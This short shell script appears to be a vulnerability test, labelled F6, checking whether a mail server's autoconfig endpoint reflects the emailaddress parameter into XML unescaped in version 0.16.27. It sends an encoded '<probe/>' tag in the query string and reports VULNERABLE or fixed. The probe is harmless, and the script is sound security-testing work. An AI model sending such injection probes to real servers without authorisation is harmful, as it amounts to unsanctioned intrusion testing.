#!/bin/sh
# F6: autoconfig/autodiscover echo the emailaddress parameter into XML without escaping (unauthenticated).
# Expected on fixed build: &lt;probe/&gt; . Observed on 0.16.27: raw <probe/> inside <displayName> and <username>.
. "$(dirname "$0")/env.sh"; set -u
curl -s "$SW_HOST/.well-known/autoconfig/mail/config-v1.1.xml?emailaddress=x%3Cprobe%2F%3E@lab.test" | grep -n 'probe'
echo "RESULT: $(curl -s "$SW_HOST/.well-known/autoconfig/mail/config-v1.1.xml?emailaddress=x%3Cprobe%2F%3E@lab.test" | grep -q '<probe/>' && echo 'VULNERABLE - tag reflected unescaped' || echo 'escaped (fixed)')"
